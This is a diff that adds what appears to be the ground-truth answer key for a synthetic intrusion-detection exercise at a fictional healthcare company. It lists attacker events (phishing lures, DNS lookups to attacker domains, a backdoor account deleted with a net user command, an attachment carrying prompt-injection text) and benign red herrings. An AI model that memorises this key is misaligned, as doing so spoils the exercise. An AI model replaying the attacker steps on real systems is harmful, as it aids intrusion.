+      "storyline_id": "evt-031",
+      "time": "2024-03-18T17:45:05Z",
+      "actor": "root",
+      "system": "APP-INT-01",
+      "activity": "Standalone DNS queries for attacker infrastructure",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "qtype": "A",
+        "query": "api.westbridge-services.net",
+        "rcode": "NOERROR"
+      }
+    },
+    {
+      "record_id": "evt-031#2",
+      "kind": "dns_query",
+      "storyline_id": "evt-031",
+      "time": "2024-03-18T17:45:06Z",
+      "actor": "root",
+      "system": "APP-INT-01",
+      "activity": "Standalone DNS queries for attacker infrastructure",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "qtype": "TXT",
+        "query": "metrics.westbridge-services.net",
+        "rcode": "NXDOMAIN"
+      }
+    },
+    {
+      "record_id": "evt-032#0",
+      "kind": "process",
+      "storyline_id": "evt-032",
+      "time": "2024-03-18T17:49:40Z",
+      "actor": "SYSTEM",
+      "system": "DC-01",
+      "activity": "Delete backdoor account after exfiltration",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "net user svc_mhsync /delete /domain",
+        "pid": 6528,
+        "process_name": "C:\\Windows\\System32\\net.exe"
+      }
+    },
+    {
+      "record_id": "evt-032#1",
+      "kind": "account_deleted",
+      "storyline_id": "evt-032",
+      "time": "2024-03-18T17:49:42Z",
+      "actor": "SYSTEM",
+      "system": "DC-01",
+      "activity": "Delete backdoor account after exfiltration",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "target_username": "svc_mhsync"
+      }
+    },
+    {
+      "record_id": "evt-033#0",
+      "kind": "logoff",
+      "storyline_id": "evt-033",
+      "time": "2024-03-18T17:55:09Z",
+      "actor": "aisha.johnson",
+      "system": "WS-AJOHNSON-01",
+      "activity": "Attacker logs off compromised help desk workstation",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {}
+    },
+    {
+      "record_id": "evt-034#0",
+      "kind": "logoff",
+      "storyline_id": "evt-034",
+      "time": "2024-03-18T17:55:31Z",
+      "actor": "svc_mhsync",
+      "system": "FILE-SRV-01",
+      "activity": "Backdoor account session logs off FILE-SRV-01",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {}
+    },
+    {
+      "record_id": "evt-035#0",
+      "kind": "logoff",
+      "storyline_id": "evt-035",
+      "time": "2024-03-18T17:56:48Z",
+      "actor": "root",
+      "system": "APP-INT-01",
+      "activity": "Root SSH session logs off APP-INT-01",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {}
+    },
+    {
+      "record_id": "evt-email-001#0",
+      "kind": "email_message",
+      "storyline_id": "evt-email-001",
+      "time": "2024-03-18T12:11:41Z",
+      "actor": "diego.ramirez",
+      "system": "WS-DRAMIREZ-01",
+      "activity": "External benefits-themed phishing message is delivered to Finance with hidden security Bcc",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "artifact_id": "benefits-confirmation-msg",
+        "artifact_path": "artifacts/email/benefits-confirmation-msg.eml",
+        "message_id": "<notices-b9dac45a-8235363@benefits-serviceportal.com>",
+        "outcome": "delivered",
+        "recipients": [
+          "diego.ramirez@meridianhcs.com",
+          "evelyn.brooks@meridianhcs.com",
+          "priya.patel@meridianhcs.com"
+        ],
+        "sender": "notices@benefits-serviceportal.com",
+        "smtp_uids": [
+          "CjzVNIp2W29J8EEoaR",
+          "C8JUf23zsYbSWXAkOBk"
+        ],
+        "subject": "Benefits confirmation required today",
+        "route": [
+          {
+            "src": "eu-smtp-inbound-1.mimecast.com",
+            "dst": "MAIL-EDGE-01",
+            "src_fqdn": "eu-smtp-inbound-1.mimecast.com",
+            "dst_fqdn": "mail.meridianhcs.com",
+            "port": "25",
+            "tls": "false",
+            "routing_mode": "inbound",
+            "recipient_domains": "meridianhcs.com",
+            "uid": "CjzVNIp2W29J8EEoaR"
+          },
+          {
+            "src": "MAIL-EDGE-01",
+            "dst": "MAIL-FIN-01",
+            "src_fqdn": "mail.meridianhcs.com",
+            "dst_fqdn": "mail-fin.meridianhcs.com",
+            "port": "25",
+            "tls": "false",
+            "routing_mode": "internal",
+            "recipient_domains": "meridianhcs.com",
+            "uid": "C8JUf23zsYbSWXAkOBk"
+          }
+        ]
+      }
+    },
+    {
+      "record_id": "evt-email-002#0",
+      "kind": "email_read",
+      "storyline_id": "evt-email-002",
+      "time": "2024-03-18T12:18:20Z",
+      "actor": "diego.ramirez",
+      "system": "WS-DRAMIREZ-01",
+      "activity": "Finance user reads the suspicious benefits message through OWA",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "count": 4,
+        "mailbox": "diego.ramirez@meridianhcs.com",
+        "message_ids": [
+          "benefits-confirmation-msg"
+        ],
+        "protocol": "owa",
+        "server": "finance",
+        "uid": "C9zvAvk3TYViUwX7M"
+      }
+    },
+    {
+      "record_id": "evt-email-003#0",
+      "kind": "email_message",
+      "storyline_id": "evt-email-003",
+      "time": "2024-03-18T12:24:09Z",
+      "actor": "diego.ramirez",
+      "system": "WS-DRAMIREZ-01",
+      "activity": "Diego forwards the suspicious message to the help desk and discreetly copies security",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "artifact_id": "finance-forward-to-it-msg",
+        "artifact_path": "artifacts/email/finance-forward-to-it-msg.eml",
+        "message_id": "<100000I9EMNA.1000OREDIL@meridianhcs.com>",
+        "outcome": "delivered",
+        "recipients": [
+          "aisha.johnson@meridianhcs.com",
+          "marcus.chen@meridianhcs.com",
+          "priya.patel@meridianhcs.com"
+        ],
+        "sender": "diego.ramirez@meridianhcs.com",
+        "smtp_uids": [
+          "CKOdtW76YRwPyEfnnGX",
+          "Cecrd2bvTZCV73laRLt"
+        ],
+        "subject": "Fwd: Benefits confirmation required today",
+        "route": [
+          {
+            "src": "WS-DRAMIREZ-01",
+            "dst": "MAIL-FIN-01",
+            "src_fqdn": "WS-DRAMIREZ-01.meridianhcs.local",
+            "dst_fqdn": "mail-fin.meridianhcs.com",
+            "port": "587",
+            "tls": "true",
+            "routing_mode": "internal",
+            "recipient_domains": "meridianhcs.com",
+            "uid": "CKOdtW76YRwPyEfnnGX"
+          },
+          {
+            "src": "MAIL-FIN-01",
+            "dst": "MAIL-EDGE-01",
+            "src_fqdn": "mail-fin.meridianhcs.com",
+            "dst_fqdn": "mail.meridianhcs.com",
+            "port": "25",
+            "tls": "false",
+            "routing_mode": "internal",
+            "recipient_domains": "meridianhcs.com",
+            "uid": "Cecrd2bvTZCV73laRLt"
+          }
+        ]
+      }
+    },
+    {
+      "record_id": "evt-email-004#0",
+      "kind": "email_message",
+      "storyline_id": "evt-email-004",
+      "time": "2024-03-18T12:48:11Z",
+      "actor": "lina.nguyen",
+      "system": "WS-LNGUYEN-01",
+      "activity": "Engineering sends an internal EHR release note to a clinical operations distribution group",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "artifact_id": "ehr-release-note-msg",
+        "artifact_path": "artifacts/email/ehr-release-note-msg.eml",
+        "message_id": "<1746897100.499514.89c6aefa@meridianhcs.com>",
+        "outcome": "delivered",
+        "recipients": [
+          "lina.nguyen@meridianhcs.com",
+          "omar.haddad@meridianhcs.com",
+          "priya.patel@meridianhcs.com"
+        ],
+        "sender": "lina.nguyen@meridianhcs.com",
+        "smtp_uids": [
+          "CjLmXu5BelbH9LHtYL",
+          "CVqlan2GwYmIeguYvJK"
+        ],
+        "subject": "EHR connector release notes",
+        "route": [
+          {
+            "src": "WS-LNGUYEN-01",
+            "dst": "MAIL-CLIN-01",
+            "src_fqdn": "WS-LNGUYEN-01.meridianhcs.local",
+            "dst_fqdn": "mail-clinical.meridianhcs.com",
+            "port": "587",
+            "tls": "true",
+            "routing_mode": "internal",
+            "recipient_domains": "meridianhcs.com,research.meridianhcs.com",
+            "uid": "CjLmXu5BelbH9LHtYL"
+          },
+          {
+            "src": "MAIL-CLIN-01",
+            "dst": "MAIL-EDGE-01",
+            "src_fqdn": "mail-clinical.meridianhcs.com",
+            "dst_fqdn": "mail.meridianhcs.com",
+            "port": "25",
+            "tls": "true",
+            "routing_mode": "internal",
+            "recipient_domains": "meridianhcs.com",
+            "uid": "CVqlan2GwYmIeguYvJK"
+          }
+        ]
+      }
+    },
+    {
+      "record_id": "evt-email-005#0",
+      "kind": "email_read",
+      "storyline_id": "evt-email-005",
+      "time": "2024-03-18T12:53:16Z",
+      "actor": "omar.haddad",
+      "system": "WS-OHADDAD-01",
+      "activity": "Analytics user reads the EHR release note through IMAPS",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "count": 5,
+        "mailbox": "omar.haddad@meridianhcs.com",
+        "message_ids": [
+          "ehr-release-note-msg"
+        ],
+        "protocol": "imaps",
+        "server": "clinical",
+        "uid": "CQkthsd7Wzc9OA8mA3"
+      }
+    },
+    {
+      "record_id": "evt-email-006#0",
+      "kind": "email_message",
+      "storyline_id": "evt-email-006",
+      "time": "2024-03-18T13:49:40Z",
+      "actor": "priya.patel",
+      "system": "WS-PPATEL-01",
+      "activity": "A vendor document workflow sends security an AI-generated summary with prompt-injection text in an attachment",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "artifact_id": "docflow-ai-summary-msg",
+        "artifact_path": "artifacts/email/docflow-ai-summary-msg.eml",
+        "message_id": "<workspace-e2b1dcaf-9440641@docflow-health.net>",
+        "outcome": "delivered",
+        "recipients": [
+          "priya.patel@meridianhcs.com"
+        ],
+        "sender": "workspace@docflow-health.net",
+        "smtp_uids": [
+          "C4ftrB0GMg0JnKsIFS"
+        ],
+        "subject": "DocFlow summary package: vendor terms",
+        "route": [
+          {
+            "src": "aspmx.l.google.com",
+            "dst": "MAIL-EDGE-01",
+            "src_fqdn": "aspmx.l.google.com",
+            "dst_fqdn": "mail.meridianhcs.com",
+            "port": "25",
+            "tls": "true",
+            "routing_mode": "inbound",
+            "recipient_domains": "meridianhcs.com",
+            "uid": "C4ftrB0GMg0JnKsIFS"
+          }
+        ]
+      }
+    },
+    {
+      "record_id": "evt-email-007#0",
+      "kind": "email_message",
+      "storyline_id": "evt-email-007",
+      "time": "2024-03-18T13:55:34Z",
+      "actor": "lina.nguyen",
+      "system": "WS-LNGUYEN-01",
+      "activity": "Engineering sends an outbound interface package to a lab vendor through the clinical route and ISP relay",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "artifact_id": "vendor-interface-package-msg",
+        "artifact_path": "artifacts/email/vendor-interface-package-msg.eml",
+        "message_id": "<1486572785.976919.3e76dbd7@meridianhcs.com>",
+        "outcome": "delivered",
+        "recipients": [
+          "miles.avery@stonebridge-consultingllc.com",
+          "omar.haddad@meridianhcs.com"
+        ],
+        "sender": "lina.nguyen@meridianhcs.com",
+        "smtp_uids": [
+          "Cnf7DkUcyIsOj1R03k",
+          "C8ZNQiyxA8OzuJ8NHgZ"
+        ],
+        "subject": "Stonebridge interface package comments",
+        "route": [
+          {
+            "src": "WS-LNGUYEN-01",
+            "dst": "MAIL-CLIN-01",
+            "src_fqdn": "WS-LNGUYEN-01.meridianhcs.local",
+            "dst_fqdn": "mail-clinical.meridianhcs.com",
+            "port": "587",
+            "tls": "true",
+            "routing_mode": "internal",
+            "recipient_domains": "meridianhcs.com,stonebridge-consultingllc.com",
+            "uid": "Cnf7DkUcyIsOj1R03k"
+          },
+          {
+            "src": "MAIL-CLIN-01",
+            "dst": "smtp1.greatplains-mail.net",
+            "src_fqdn": "mail-clinical.meridianhcs.com",
+            "dst_fqdn": "smtp1.greatplains-mail.net",
+            "port": "25",
+            "tls": "true",
+            "routing_mode": "smart_host",
+            "recipient_domains": "stonebridge-consultingllc.com",
+            "uid": "C8ZNQiyxA8OzuJ8NHgZ"
+          }
+        ]
+      }
+    },
+    {
+      "record_id": "evt-email-008#0",
+      "kind": "email_message",
+      "storyline_id": "evt-email-008",
+      "time": "2024-03-18T15:08:04Z",
+      "actor": "aisha.johnson",
+      "system": "WS-AJOHNSON-01",
+      "activity": "Compromised help desk mailbox sends an internal credential-reset lure to finance",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "artifact_id": "internal-reset-lure-msg",
+        "artifact_path": "artifacts/email/internal-reset-lure-msg.eml",
+        "message_id": "<121609FF-AFF2-1350-BCEC-8A52032BE7D0@meridianhcs.com>",
+        "outcome": "delivered",
+        "recipients": [
+          "diego.ramirez@meridianhcs.com",
+          "evelyn.brooks@meridianhcs.com",
+          "marcus.chen@meridianhcs.com"
+        ],
+        "sender": "aisha.johnson@meridianhcs.com",
+        "smtp_uids": [
+          "C0qZe0LH4s9rggTrvG",
+          "Ca6zrbE67VirJTnvvO3"
+        ],
+        "subject": "Help desk follow-up: credential reset validation",
+        "route": [
+          {
+            "src": "WS-AJOHNSON-01",
+            "dst": "MAIL-EDGE-01",
+            "src_fqdn": "WS-AJOHNSON-01.meridianhcs.local",
+            "dst_fqdn": "mail.meridianhcs.com",
+            "port": "587",
+            "tls": "true",
+            "routing_mode": "internal",
+            "recipient_domains": "meridianhcs.com",
+            "uid": "C0qZe0LH4s9rggTrvG"
+          },
+          {
+            "src": "MAIL-EDGE-01",
+            "dst": "MAIL-FIN-01",
+            "src_fqdn": "mail.meridianhcs.com",
+            "dst_fqdn": "mail-fin.meridianhcs.com",
+            "port": "25",
+            "tls": "false",
+            "routing_mode": "internal",
+            "recipient_domains": "meridianhcs.com",
+            "uid": "Ca6zrbE67VirJTnvvO3"
+          }
+        ]
+      }
+    },
+    {
+      "record_id": "evt-email-009#0",
+      "kind": "email_read",
+      "storyline_id": "evt-email-009",
+      "time": "2024-03-18T15:13:51Z",
+      "actor": "aisha.johnson",
+      "system": "WS-AJOHNSON-01",
+      "activity": "Attacker reads the compromised help desk mailbox through IMAPS",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "count": 7,
+        "mailbox": "aisha.johnson@meridianhcs.com",
+        "message_ids": [
+          "finance-forward-to-it-msg",
+          "internal-reset-lure-msg"
+        ],
+        "protocol": "imaps",
+        "server": "edge",
+        "uid": "Cas0MHhgW7VDvvhIE"
+      }
+    },
+    {
+      "record_id": "evt-email-010#0",
+      "kind": "email_message",
+      "storyline_id": "evt-email-010",
+      "time": "2024-03-18T16:06:57Z",
+      "actor": "evelyn.brooks",
+      "system": "WS-EBROOKS-01",
+      "activity": "External invoice-themed attachment is rejected by the mail gateway",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "artifact_id": "blocked-invoice-msg",
+        "artifact_path": "",
+        "message_id": "<billing-a1f65b41-3807664@medclaims-processing.net>",
+        "outcome": "rejected",
+        "recipients": [
+          "evelyn.brooks@meridianhcs.com"
+        ],
+        "sender": "billing@medclaims-processing.net",
+        "smtp_uids": [
+          "C2YGPKAe2bcCObFBPMt"
+        ],
+        "subject": "Updated claims processing invoice",
+        "route": [
+          {
+            "src": "mailhost.medclaims-processing.net",
+            "dst": "MAIL-EDGE-01",
+            "src_fqdn": "mailhost.medclaims-processing.net",
+            "dst_fqdn": "mail.meridianhcs.com",
+            "port": "25",
+            "tls": "true",
+            "routing_mode": "inbound",
+            "recipient_domains": "meridianhcs.com",
+            "uid": "C2YGPKAe2bcCObFBPMt"
+          }
+        ]
+      }
+    },
+    {
+      "record_id": "evt-email-011#0",
+      "kind": "email_message",
+      "storyline_id": "evt-email-011",
+      "time": "2024-03-18T16:50:00Z",
+      "actor": "evelyn.brooks",
+      "system": "WS-EBROOKS-01",
+      "activity": "Executive sends an inline-authored operating note to an outside advisor with internal Bcc",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "artifact_id": "executive-operating-note-msg",
+        "artifact_path": "artifacts/email/executive-operating-note-msg.eml",
+        "message_id": "<1000016ONZTK.10015EDCND@meridianhcs.com>",
+        "outcome": "delivered",
+        "recipients": [
+          "marina.holt@northbridge-advisory.com",
+          "diego.ramirez@meridianhcs.com",
+          "priya.patel@meridianhcs.com"
+        ],
+        "sender": "evelyn.brooks@meridianhcs.com",
+        "smtp_uids": [
+          "CpmBeS9LWMHl1yhKPr",
+          "CYAUd0CcpV3Vzq3eVu",
+          "Czd3G1WQ5KeHNwdO3H"
+        ],
+        "subject": "March operating note",
+        "route": [
+          {
+            "src": "WS-EBROOKS-01",
+            "dst": "MAIL-FIN-01",
+            "src_fqdn": "WS-EBROOKS-01.meridianhcs.local",
+            "dst_fqdn": "mail-fin.meridianhcs.com",
+            "port": "587",
+            "tls": "true",
+            "routing_mode": "internal",
+            "recipient_domains": "meridianhcs.com,northbridge-advisory.com",
+            "uid": "CpmBeS9LWMHl1yhKPr"
+          },
+          {
+            "src": "MAIL-FIN-01",
+            "dst": "MAIL-EDGE-01",
+            "src_fqdn": "mail-fin.meridianhcs.com",
+            "dst_fqdn": "mail.meridianhcs.com",
+            "port": "25",
+            "tls": "false",
+            "routing_mode": "internal",
+            "recipient_domains": "meridianhcs.com,northbridge-advisory.com",
+            "uid": "CYAUd0CcpV3Vzq3eVu"
+          },
+          {
+            "src": "MAIL-EDGE-01",
+            "dst": "relay2.northlake-messaging.net",
+            "src_fqdn": "mail.meridianhcs.com",
+            "dst_fqdn": "relay2.northlake-messaging.net",
+            "port": "25",
+            "tls": "true",
+            "routing_mode": "smart_host",
+            "recipient_domains": "northbridge-advisory.com",
+            "uid": "Czd3G1WQ5KeHNwdO3H"
+          }
+        ]
+      }
+    },
+    {
+      "record_id": "red_herring:rh-001#0",
+      "kind": "failed_logon",
+      "storyline_id": "red_herring:rh-001",
+      "time": "2024-03-18T13:04:44Z",
+      "actor": "sophia.martinez",
+      "system": "WS-SMARTINEZ-01",
+      "activity": "Sales user mistypes password several times before a normal logon",
+      "ground_truth_section": "red_herring",
+      "emitted": true,
+      "explanation": "Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement.",
+      "attributes": {
+        "source_ip": "10.10.1.36"
+      }
+    },
+    {
+      "record_id": "red_herring:rh-001#1",
+      "kind": "failed_logon",
+      "storyline_id": "red_herring:rh-001",
+      "time": "2024-03-18T13:04:46Z",
+      "actor": "sophia.martinez",
+      "system": "WS-SMARTINEZ-01",
+      "activity": "Sales user mistypes password several times before a normal logon",
+      "ground_truth_section": "red_herring",
+      "emitted": true,
+      "explanation": "Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement.",
+      "attributes": {
+        "source_ip": "10.10.1.36"
+      }
+    },
+    {
+      "record_id": "red_herring:rh-001#2",
+      "kind": "failed_logon",
+      "storyline_id": "red_herring:rh-001",
+      "time": "2024-03-18T13:04:52Z",
+      "actor": "sophia.martinez",
+      "system": "WS-SMARTINEZ-01",
+      "activity": "Sales user mistypes password several times before a normal logon",
+      "ground_truth_section": "red_herring",
+      "emitted": true,
+      "explanation": "Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement.",
+      "attributes": {
+        "source_ip": "10.10.1.36"
+      }
+    },
+    {
+      "record_id": "red_herring:rh-001#3",
+      "kind": "logon",
+      "storyline_id": "red_herring:rh-001",
+      "time": "2024-03-18T13:04:54Z",
+      "actor": "sophia.martinez",
+      "system": "WS-SMARTINEZ-01",
+      "activity": "Sales user mistypes password several times before a normal logon",
+      "ground_truth_section": "red_herring",
+      "emitted": true,
+      "explanation": "Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement.",
+      "attributes": {
+        "logon_id": "0xc1850e3",
+        "source_ip": "10.10.1.36"
+      }
+    },
+    {
+      "record_id": "red_herring:rh-002#0",
+      "kind": "rdp_session",
+      "storyline_id": "red_herring:rh-002",
+      "time": "2024-03-18T17:09:44Z",
+      "actor": "marcus.chen",
+      "system": "DC-01",
+      "activity": "Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01",
+      "ground_truth_section": "red_herring",
+      "emitted": true,
+      "explanation": "Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics.",
+      "attributes": {
+        "dst_ip": "10.10.2.10",
+        "dst_port": 3389,
+        "uid": "CZR6dgF4Wb3HJEVJ5"
+      }
+    },
+    {
+      "record_id": "red_herring:rh-002#1",
+      "kind": "process",
+      "storyline_id": "red_herring:rh-002",
+      "time": "2024-03-18T17:09:47Z",
+      "actor": "marcus.chen",
+      "system": "DC-01",
+      "activity": "Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01",
+      "ground_truth_section": "red_herring",
+      "emitted": true,
+      "explanation": "Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics.",
+      "attributes": {
+        "command_line": "powershell.exe -NoProfile -Command \"Get-EventLog -LogName System -Newest 50\"",
+        "pid": 6604,
+        "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      }
+    },
+    {
+      "record_id": "red_herring:rh-002#2",
+      "kind": "process",
+      "storyline_id": "red_herring:rh-002",
+      "time": "2024-03-18T17:09:48Z",
+      "actor": "marcus.chen",
+      "system": "DC-01",
+      "activity": "Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01",
+      "ground_truth_section": "red_herring",
+      "emitted": true,
+      "explanation": "Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics.",
+      "attributes": {
+        "command_line": "powershell.exe -NoProfile -Command \"Test-Connection FILE-SRV-01 -Count 4\"",
+        "pid": 6612,
+        "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      }
+    }
+  ]
+}
